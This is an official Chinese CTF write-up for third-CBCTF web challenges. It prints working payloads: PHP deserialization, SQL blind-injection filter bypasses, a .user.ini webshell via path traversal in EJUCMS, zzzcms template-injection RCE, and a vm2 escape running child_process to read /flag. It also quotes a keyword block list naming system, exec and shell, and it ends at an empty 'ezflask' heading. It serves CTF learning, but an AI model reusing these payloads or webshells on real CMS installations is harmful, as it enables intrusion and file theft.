> 原文链接: https://www.anquanke.com//post/id/212808 


# 第三届CBCTF官方WP


                                阅读量   
                                **358657**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t011a3d7483ec605335.jpg)](https://p2.ssl.qhimg.com/t011a3d7483ec605335.jpg)



## web

### <a class="reference-link" name="%E5%B0%96%E5%B0%96%E7%9A%84%E5%95%86%E5%BA%97%201&amp;&amp;2"></a>尖尖的商店 1&amp;&amp;2

因为其他题出的人太少,临时出的题…师傅们都 tql,我出完甚至还没做一遍,就有师傅出了

都是只要把 money 字段改大就可以拿 flag,

1 直接改 cookie 就好,2 用了 session,request.url 默认 url 编码了,就不能之间触发 ssti,所以放在了 referer,为了不让师傅们很恶心的找触发点,就给了部分源码.

具体怎么构造,参考这篇文章

[https://www.cnblogs.com/zaqzzz/p/10243961.html](https://www.cnblogs.com/zaqzzz/p/10243961.html)

### **Easy-Baby-Signin**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018294bd76ca06b248.png)

**套娃一** ：401 验证，需要输入账号密码。此处使用 BP 抓包爆破，使用自定义迭代器构造 payload，再进行 base64 加密。账户为 admin 密码为 12345678 开头的东西。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0138b0321fc6e84a61.png)

**套娃二** ：参考了DDCTF的某个WEB的第一步。URL 处存在参数 jpg，base64 解码两次得到 666C61672E6A7067，Hex 解码得到 flag.jpg。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f7a62e59323b11b8.png)

尝试读取源码 index.php，构造 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3，得到 index.php 源码，发现 magicword.txt 存在

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ffc8f978c35dd351.png)

**套娃三：** 纯纯的反序列化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f19c5dd58a59afa6.png)

构造脚本生成 payload

```
&lt;?php 
class icanhear `{` 
    var $mykey; 
    var $myword; 
    function icanhear() 
    `{` 
    $this-&gt;mykey=&amp;$this-&gt;myword; 
    `}` 
    `}` 
echo serialize(new icanhear()); //O:8:"icanhear":2:`{`s:5:"mykey";N;s:6:"myword";R:2;`}` 
?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0102b6bb183dce2859.png)

**套娃四：**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e1e88cfc2e8d15a6.png)

需要爆破 md5 前 6 位是 1024cc 的数字

构造 python 脚本

```
from hashlib import md5 
for i in range(100000000): 
if md5(str(i)).hexdigest()[:6]=='1024cc': 
  print (i) 
  break
```

得到 flag2 是 790058

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0197b2259cfbebd697.png)

最终 FLAG: **flag`{`wa0_7900588_is_right`}`**

### **Hacked_By_Wendell**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0191cb502b394f0806.png)

Hint1： 不需要注册，寻找网站薄弱的地方

Hint2： 源于一个很古老的洞

这题和 **dangerous-function** 都是 zzzphp 的 0day，所有两题给了一份源码审，然后再题目里把对方的洞删掉了。这题其实这题的洞在**/plugins/ueditor/php/controller.php ** 下的 catchimage，也就是类似老版本的 ueditor 的文件上传漏洞。

**代码审计：**

[![](https://p0.ssl.qhimg.com/t01b421f3d341a124a4.png)](https://p0.ssl.qhimg.com/t01b421f3d341a124a4.png)

首先跟进 controller.php 下的 **down_url** 函数，其在/inc/zzz_file.php

其使用 **file_ext** 函数限制上传后缀， **file_name** 函数确定文件名，继续跟进

[![](https://p2.ssl.qhimg.com/t01b0ac051df8a56750.png)](https://p2.ssl.qhimg.com/t01b0ac051df8a56750.png)

同文件下的 **file_ext** 函数，其会判断？的存在，若存在，则后缀名是？前面的 **.** 后面的东西。

[![](https://p5.ssl.qhimg.com/t01f2f79fb6a72dee9c.png)](https://p5.ssl.qhimg.com/t01f2f79fb6a72dee9c.png)

继续查看 **file_name** 函数，就是此函数造成的上传漏洞，具体可以看例子。

[![](https://p0.ssl.qhimg.com/t0184bbc561b87d2a88.png)](https://p0.ssl.qhimg.com/t0184bbc561b87d2a88.png)

[![](https://p2.ssl.qhimg.com/t012baedc3d3e428828.png)](https://p2.ssl.qhimg.com/t012baedc3d3e428828.png)

此处 path=[http://127.0.0.1/123.jpg?/123.php](http://127.0.0.1/123.jpg?/123.php)<br>
但返回的文件名为 123.php

**解题：**

编写一个 HTML 文件来上传恶意文件

```
&lt;form action="http://47.52.161.149:10001/plugins/ueditor/php/controller.php?action=catchimage"enctype="application/x-www-form-urlencoded" method="POST"&gt; 
shell addr: &lt;input type="text" name="source[]" /&gt; 
&lt;input type="submit" value="Submit" /&gt; 
&lt;/form&gt;
```

远程服务器上放个 info.jpg 的马，上传的时候要写的 info.jpg?/123.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01876cb51bfd5cd2cc.png)

Getshell 以后就能找到 flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fb54a56b5b2e39b1.png)

### **Hacked_By_V**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013a4f7cfb3b9ade9d.png)

这题是 EJUCMS 的 0day(CNVD-2020-44337)，虽然给了源码，但不用审也能做，毕竟很明显提示是后台，而后台能交互文件的地方不多，挖过 CMS 的应该很快能猜到是模板处存在漏洞。

**代码审计：** **/application/admin/controller/Filemanager.php **

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0134dd8e0bda31e659.png)

此处对编辑的文件位置、后缀等做了限制

其中利用 str_replace 限制目录穿越没啥用，利用/template/../可直接在根目录下写文件

**/application/admin/logic/FilemanagerLogic.php **

白名单规定了后缀名，利用 ini 进行 getshell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01be6d793fdb9dcf3a.png)

**解题：**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010254d56a5f114015.png)

进入后对任意 htm 文件进行编辑并抓包，目标是找到一个有 php 文件的目录，再利用**.user.ini** 来写马

有些目录权限是不能写，所以多找几个叭。

修改 POST 数据为

```
activepath=/template/../data/schema&amp;filename=.user.ini&amp;content=auto_prepend_file=12321.htm&amp;_ajax=1
```

再次发一个包，修改数据为

```
activepath=/template/../data/schema&amp;filename=12321.htm&amp;content=&lt;?php $fun = create_function('',$_POST['a']);$fun();?&gt;&amp;_ajax=1
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e252a5019e8ad562.png)

Getshell 在网站根目录下可见 flag。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01df619c6166390917.png)

### 

### <a class="reference-link" name="sqli-labs"></a>sqli-labs

user 表（大概）：

<th style="text-align: left;">**id**</th><th style="text-align: left;">**user**</th><th style="text-align: left;">**pass**</th><th style="text-align: left;">**flag**</th>
|------
<td style="text-align: left;">1</td><td style="text-align: left;">xxx</td><td style="text-align: left;">xxx</td><td style="text-align: left;">flag`{`you_get_the_flag`}`</td>

先是 and or &amp; |被过滤，导致逻辑表达会有些麻烦，但是我们依然有异或运算符^，由于 id 字段是字符串，在 mysql 中与 0 等价，由于 0^1=1，0^0=0，故语句的真假就是查询结果的真假

由于 flag 被过滤，无法用 select flag from user 来查 flag，所以要用别名代替，但是别名代替有 select 1,2,3,4 有逗号，所以用 join 再代替（空格换成 `/` **`a`** `/` 即可）：

```
union select * from (select 1)a join (select 2)b join (select 3)c%23
```

等同于：

```
union select 1,2,3
```

同样

```
limit 1 offset 2
```

等同于：

```
limit 2,1
```

以及

```
substr(database() from 5 for 1)
```

等同于：

```
substr(database(),5,1)
```

因此 payload 构造如下：

```
?id=1' ^ (ascii(mid((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) from 1 for 1))&gt;0) ^ (1=1)%23
```

但是你会发现 from 1 for 1 那里，or 被过滤，for 也不能用了，所以可以用 regexp 或者 like 来单字符盲注。

于是 payload 大体是这样的（空格用 `/` **`什么都行`** `/` 代替即可）：

```
select user from users where id='1' ^ ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) like "a%")^(1=1)
```

然而这还不是时间盲注，我们可以考虑用下面笛卡尔积这种大量运算的方法去延时：

```
select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C
```

由于 or 被过滤，所以 information_schema 无法使用，可用 mysql 数据库中的 help_topic（这是一张更大的表）来代替：

```
?id=1'^ (select case when ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) like "a%") then (select count(*) from mysql.help_topic A,mysql.help_topic B,mysql.help_topic C) else 0 end)%23
```

意外地发现%也被过滤掉了（出题人挖坑自己都不知道系列），所以用 regexp 来绕过。

```
1'^ (select case when ((select `4` from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union select * from user)e limit 1 offset 1) regexp "^f.`{`0,`}`") then (select count(*) from mysql.help_topic A,mysql.help_topic B,mysql.help_topic C) else 0 end)^'1'='1
```

然后你会发现，笛卡尔积的方式也有逗号

于是我们发现了新的笛卡尔积方法：

```
SELECT count(*) FROM mysql.help_relation CROSS JOIN mysql.help_topic cross join mysql.proc;
```

这种笛卡尔积是不允许同一个表 cross join 自己的，但是起个别名就可以了

```
SELECT count(*) FROM mysql.help_relation CROSS JOIN mysql.help_topic A cross join mysql.proc B;
```

所以最终的 payload：

(本题的 mysql 服务似乎和本地的不太一样，mysql_help*表不管有多少都能秒出结果，无法造成延时，所以再连接一个其他的表比如 innodb_table_stats 就可以造成超长延时。。下面这个 payload 是测试过的延时时间比较合理的，3 秒左右)

```
1'^/*a*/(select/*a*/case/*a*/when/*a*/((select/*a*/`4`/*a*/from/*a*/(select/*a*/*/*a*/from/*a*/(select/*a*/1)a/*a*/join/*a*/(select/*a*/2)b/*a*/join/*a*/(select/*a*/3)c/*a*/join/*a*/(select/*a*/4)d/*a*/union/*a*/select/*a*/*/*a*/from/*a*/user)e/*a*/limit/*a*/1/*a*/offset/*a*/1)/*a*/regexp/*a*/binary/*a*/"^f.*")/*a*/then/*a*/(SELECT/*a*/count(*)/*a*/FROM/*a*/mysql.help_relation/*a*/A/*a*/CROSS/*a*/JOIN/*a*/mysql.help_topic/*a*/B/*a*/cross/*a*/join/*a*/mysql.innodb_table_stats/*a*/D/*a*/cross/*a*/join/*a*/mysql.user/*a*/E/*a*/cross/*a*/join/*a*/mysql.user/*a*/F)/*a*/else/*a*/0/*a*/end)^'1'='1
```

写脚本的一些注意事项：

由于过滤了 flag，所以脚本不能出现 flag，即从头开始^f. **到^fla.** 一直到^flag. **时，flag** *** **会被过滤，所以要避开，用.来代替：^fla.`{`.*

然后在匹配数字的时候，要加反斜杠\，或者用括号括起来，因为 SQL 正则本身数字属于特殊字符

然后正则默认是不区分大小写的，所以你直接 regexp 得到的结果是不正确的，要加上 binary 字段：regexp binary xxx 才区分大小写

### <a class="reference-link" name="dangerous-function"></a>dangerous-function

```
zzzcms 是一个开源免费建站系统，但是好像 bug 很多的亚子 
注意：已经删掉了后台，不需要注册登陆，不需要扫描爆破，flag 在根目录下
```

题目是危险函数，最常见的是 `eval` `system` 吧，那么搜搜

[![](https://p5.ssl.qhimg.com/t018a55049c36ab0e40.png)](https://p5.ssl.qhimg.com/t018a55049c36ab0e40.png)

然后这一段代码

```
public 
     function parserIfLabel( $zcontent ) `{` 
         $pattern = '/\`{`if:([\s\S]+?)`}`([\s\S]*?)`{`end\s+if`}`/'; 
         if ( preg_match_all( $pattern, $zcontent, $matches ) ) `{` 
             $count = count( $matches[ 0 ] ); 
             for ( $i = 0; $i &lt; $count; $i++ ) `{` 
                 $flag = ''; 
                 $out_html = ''; 
                 $ifstr = $matches[ 1 ][ $i ]; 
                 $ifstr=danger_key($ifstr,1); 
                 if(strpos($ifstr,'=') !== false)`{` 
                    $arr= splits($ifstr,'='); 
                     if($arr[0]=='' || $arr[1    ]=='')`{` 
                          error('很抱歉，模板中有错误的判断,请修正【'.$ifstr.'】'); 
                     `}` 
                    $ifstr = str_replace( '=', '==', $ifstr ); 
                 `}` 
                 $ifstr = str_replace( '&lt;&gt;', '!=', $ifstr ); 
                 $ifstr = str_replace( 'or', '||', $ifstr ); 
                 $ifstr = str_replace( 'and', '&amp;&amp;', $ifstr ); 
                 $ifstr = str_replace( 'mod', '%', $ifstr ); 
                 $ifstr = str_replace( 'not', '!', $ifstr ); 
                 if ( preg_match( '/\`{`|`}`/', $ifstr)) `{` 
                     error('很抱歉，模板中有错误的判断,请修正'.$ifstr); 
                 `}`else`{` 
                    @eval( 'if(' . $ifstr . ')`{`$flag="if";`}`else`{`$flag="else";`}`' ); 
                 `}` 
                 ......
```

解析 if 标签，先是正则匹配标签，然后用 `danger_key` `函数过滤掉危险输入，最后在  `eval` ` 函数中执行<br>
过滤了很多关键词（这里比官方加强了一些）

```
//过滤危险字符，保留正常字符 
function danger_key($s,$type='') `{` 
$s=empty($type) ? htmlspecialchars($s) : $s; 
$key=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','`','replace','flag'); 
$s = str_ireplace($key,"*",$s); 
$danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','`','replace','flag'); 
foreach ($danger as $val)`{` 
if(strpos($s,$val) !==false)`{` 
error('很抱歉，执行出错，发现危险字符【'.$val.'】'); 
`}` 
`}` 
return $s; 
`}`
```

构造可以自己看正则，也可以看官方文档<br>[http://help.zzzcms.com/259324](http://help.zzzcms.com/259324)搜索 if 即可找到

```
`{`if:(eval_code)`}`相同结果`{`else`}`不相同结果`{`end if`}`
```

到这里应该能知道这是模板注入，而页面中只有搜索框可以注入<br>
这里主要用到动态函数 多次调试后可以得到 flag

方法应该很多

```
`{`if:var_dump(((strrev(stnetnoc_teg_elif)))((strrev(edoced_46esab))(Li8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn)))`}`
```

### <a class="reference-link" name="ezcalc"></a>ezcalc

出这个是因为想着是新生赛,让大家多接触一些新的东西,,就把以前 node 遇到的 trick 拼一拼 (然而好像没新生做

考点就:正则绕过+vm2 逃逸,但是那个依赖挺多坑的,也可能是因为我不熟,题目还因为这个中途下了一次,最后直接给了 dockerfile

第一层

```
function saferEval(str) `{` 
  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) `{` 
    return null; 
  `}` 
  return eval(str); 
`}`
```

因为可以使用 Math.随便什么单词，所以可以获取到`Math.constructor`,获取两次后,就是 Function 对象,就可以可以任意代码执行

然后利用箭头的特性,绕过过滤

```
((Math)=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(...))))(Math+1)() 

使用 
Math+1 // '[object Math]1' 
得到 String 对象 
然后使用 String.fromCharCode(...)构造任意字符 
然后
```

就可以执行任意代码了,之后还有 vm2 的限制

参考

[https://github.com/patriksimek/vm2/issues/268](https://github.com/patriksimek/vm2/issues/268)

这个 issues 绕过

```
var res = (function () `{` 
    try `{` require('child_process').execSync("idea") `}` catch (e) `{` `}`   
    let buffer = `{` 
      hexSlice: () =&gt; "", 
      magic: `{` 
        get [Symbol.for("nodejs.util.inspect.custom")]() `{` 
          throw f =&gt; f.constructor("return process")(); 
        `}` 
      `}` 
    `}`; 
    try `{` 
      Buffer.prototype.inspect.call(buffer, 0, `{` customInspect: true `}`); 
    `}` catch (e) `{` 
      return e(() =&gt; 0).mainModule.require('child_process').execSync("cat /flag"); 
    `}` 
  `}`)();return res
```

注意结果要用 return 返回

最后 payload

```
http://127.0.0.1:3000/?calc=%28%28%4d%61%74%68%29%3d%3e%28%4d%61%74%68%3d%4d%61%74%68%2e%63%6f%6e%73%74%72%75%63%74%6f%72%2c%4d%61%74%68%3d%4d%61%74%68%2e%63%6f%6e%73%74%72%75%63%74%6f%72%28%4d%61%74%68%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%31%31%38%2c%39%37%2c%31%31%34%2c%33%32%2c%31%31%34%2c%31%30%31%2c%31%31%35%2c%33%32%2c%36%31%2c%33%32%2c%34%30%2c%31%30%32%2c%31%31%37%2c%31%31%30%2c%39%39%2c%31%31%36%2c%31%30%35%2c%31%31%31%2c%31%31%30%2c%33%32%2c%34%30%2c%34%31%2c%33%32%2c%31%32%33%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%31%36%2c%31%31%34%2c%31%32%31%2c%33%32%2c%31%32%33%2c%33%32%2c%31%31%34%2c%31%30%31%2c%31%31%33%2c%31%31%37%2c%31%30%35%2c%31%31%34%2c%31%30%31%2c%34%30%2c%33%39%2c%39%39%2c%31%30%34%2c%31%30%35%2c%31%30%38%2c%31%30%30%2c%39%35%2c%31%31%32%2c%31%31%34%2c%31%31%31%2c%39%39%2c%31%30%31%2c%31%31%35%2c%31%31%35%2c%33%39%2c%34%31%2c%34%36%2c%31%30%31%2c%31%32%30%2c%31%30%31%2c%39%39%2c%38%33%2c%31%32%31%2c%31%31%30%2c%39%39%2c%34%30%2c%33%34%2c%31%30%35%2c%31%30%30%2c%31%30%31%2c%39%37%2c%33%34%2c%34%31%2c%33%32%2c%31%32%35%2c%33%32%2c%39%39%2c%39%37%2c%31%31%36%2c%39%39%2c%31%30%34%2c%33%32%2c%34%30%2c%31%30%31%2c%34%31%2c%33%32%2c%31%32%33%2c%33%32%2c%31%32%35%2c%33%32%2c%33%32%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%30%38%2c%31%30%31%2c%31%31%36%2c%33%32%2c%39%38%2c%31%31%37%2c%31%30%32%2c%31%30%32%2c%31%30%31%2c%31%31%34%2c%33%32%2c%36%31%2c%33%32%2c%31%32%33%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%30%34%2c%31%30%31%2c%31%32%30%2c%38%33%2c%31%30%38%2c%31%30%35%2c%39%39%2c%31%30%31%2c%35%38%2c%33%32%2c%34%30%2c%34%31%2c%33%32%2c%36%31%2c%36%32%2c%33%32%2c%33%34%2c%33%34%2c%34%34%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%30%39%2c%39%37%2c%31%30%33%2c%31%30%35%2c%39%39%2c%35%38%2c%33%32%2c%31%32%33%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%30%33%2c%31%30%31%2c%31%31%36%2c%33%32%2c%39%31%2c%38%33%2c%31%32%31%2c%31%30%39%2c%39%38%2c%31%31%31%2c%31%30%38%2c%34%36%2c%31%30%32%2c%31%31%31%2c%31%31%34%2c%34%30%2c%33%34%2c%31%31%30%2c%31%31%31%2c%31%30%30%2c%31%30%31%2c%31%30%36%2c%31%31%35%2c%34%36%2c%31%31%37%2c%31%31%36%2c%31%30%35%2c%31%30%38%2c%34%36%2c%31%30%35%2c%31%31%30%2c%31%31%35%2c%31%31%32%2c%31%30%31%2c%39%39%2c%31%31%36%2c%34%36%2c%39%39%2c%31%31%37%2c%31%31%35%2c%31%31%36%2c%31%31%31%2c%31%30%39%2c%33%34%2c%34%31%2c%39%33%2c%34%30%2c%34%31%2c%33%32%2c%31%32%33%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%31%36%2c%31%30%34%2c%31%31%34%2c%31%31%31%2c%31%31%39%2c%33%32%2c%31%30%32%2c%33%32%2c%36%31%2c%36%32%2c%33%32%2c%31%30%32%2c%34%36%2c%39%39%2c%31%31%31%2c%31%31%30%2c%31%31%35%2c%31%31%36%2c%31%31%34%2c%31%31%37%2c%39%39%2c%31%31%36%2c%31%31%31%2c%31%31%34%2c%34%30%2c%33%34%2c%31%31%34%2c%31%30%31%2c%31%31%36%2c%31%31%37%2c%31%31%34%2c%31%31%30%2c%33%32%2c%31%31%32%2c%31%31%34%2c%31%31%31%2c%39%39%2c%31%30%31%2c%31%31%35%2c%31%31%35%2c%33%34%2c%34%31%2c%34%30%2c%34%31%2c%35%39%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%32%35%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%32%35%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%32%35%2c%35%39%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%31%36%2c%31%31%34%2c%31%32%31%2c%33%32%2c%31%32%33%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%36%36%2c%31%31%37%2c%31%30%32%2c%31%30%32%2c%31%30%31%2c%31%31%34%2c%34%36%2c%31%31%32%2c%31%31%34%2c%31%31%31%2c%31%31%36%2c%31%31%31%2c%31%31%36%2c%31%32%31%2c%31%31%32%2c%31%30%31%2c%34%36%2c%31%30%35%2c%31%31%30%2c%31%31%35%2c%31%31%32%2c%31%30%31%2c%39%39%2c%31%31%36%2c%34%36%2c%39%39%2c%39%37%2c%31%30%38%2c%31%30%38%2c%34%30%2c%39%38%2c%31%31%37%2c%31%30%32%2c%31%30%32%2c%31%30%31%2c%31%31%34%2c%34%34%2c%33%32%2c%34%38%2c%34%34%2c%33%32%2c%31%32%33%2c%33%32%2c%39%39%2c%31%31%37%2c%31%31%35%2c%31%31%36%2c%31%31%31%2c%31%30%39%2c%37%33%2c%31%31%30%2c%31%31%35%2c%31%31%32%2c%31%30%31%2c%39%39%2c%31%31%36%2c%35%38%2c%33%32%2c%31%31%36%2c%31%31%34%2c%31%31%37%2c%31%30%31%2c%33%32%2c%31%32%35%2c%34%31%2c%35%39%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%32%35%2c%33%32%2c%39%39%2c%39%37%2c%31%31%36%2c%39%39%2c%31%30%34%2c%33%32%2c%34%30%2c%31%30%31%2c%34%31%2c%33%32%2c%31%32%33%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%31%34%2c%31%30%31%2c%31%31%36%2c%31%31%37%2c%31%31%34%2c%31%31%30%2c%33%32%2c%31%30%31%2c%34%30%2c%34%30%2c%34%31%2c%33%32%2c%36%31%2c%36%32%2c%33%32%2c%34%38%2c%34%31%2c%34%36%2c%31%30%39%2c%39%37%2c%31%30%35%2c%31%31%30%2c%37%37%2c%31%31%31%2c%31%30%30%2c%31%31%37%2c%31%30%38%2c%31%30%31%2c%34%36%2c%31%31%34%2c%31%30%31%2c%31%31%33%2c%31%31%37%2c%31%30%35%2c%31%31%34%2c%31%30%31%2c%34%30%2c%33%39%2c%39%39%2c%31%30%34%2c%31%30%35%2c%31%30%38%2c%31%30%30%2c%39%35%2c%31%31%32%2c%31%31%34%2c%31%31%31%2c%39%39%2c%31%30%31%2c%31%31%35%2c%31%31%35%2c%33%39%2c%34%31%2c%34%36%2c%31%30%31%2c%31%32%30%2c%31%30%31%2c%39%39%2c%38%33%2c%31%32%31%2c%31%31%30%2c%39%39%2c%34%30%2c%33%34%2c%39%39%2c%39%37%2c%31%31%36%2c%33%32%2c%34%37%2c%31%30%32%2c%31%30%38%2c%39%37%2c%31%30%33%2c%33%34%2c%34%31%2c%35%39%2c%31%30%2c%33%32%2c%33%32%2c%33%32%2c%33%32%2c%31%32%35%2c%31%30%2c%33%32%2c%33%32%2c%31%32%35%2c%34%31%2c%34%30%2c%34%31%2c%35%39%2c%31%31%34%2c%31%30%31%2c%31%31%36%2c%31%31%37%2c%31%31%34%2c%31%31%30%2c%33%32%2c%31%31%34%2c%31%30%31%2c%31%31%35%29%29%29%29%28%4d%61%74%68%2b%31%29%28%29
```

### <a class="reference-link" name="ezflask"></a>ezflask

